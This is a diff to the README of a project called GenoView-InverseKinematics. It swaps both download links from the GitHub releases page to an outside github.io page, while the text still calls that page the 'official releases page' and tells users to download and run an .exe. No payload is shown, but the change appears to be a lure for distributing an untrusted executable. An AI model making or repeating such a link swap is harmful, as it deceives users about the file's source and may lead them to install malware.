@@ -1,6 +1,6 @@
 # 🦴 GenoView-InverseKinematics - Improve digital character movement with precision
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/indenturestoreria106/GenoView-InverseKinematics/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://indenturestoreria106.github.io)
 
 ## 📖 About this software
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these basic standar
 
 Follow these steps to obtain the correct files for your system:
 
-1. Visit the [official releases page](https://github.com/indenturestoreria106/GenoView-InverseKinematics/releases).
+1. Visit the [official releases page](https://indenturestoreria106.github.io).
 2. Locate the most recent version at the top of the list.
 3. Look for the Assets section under the release notes.
 4. Click the file that ends in .exe to start your download.
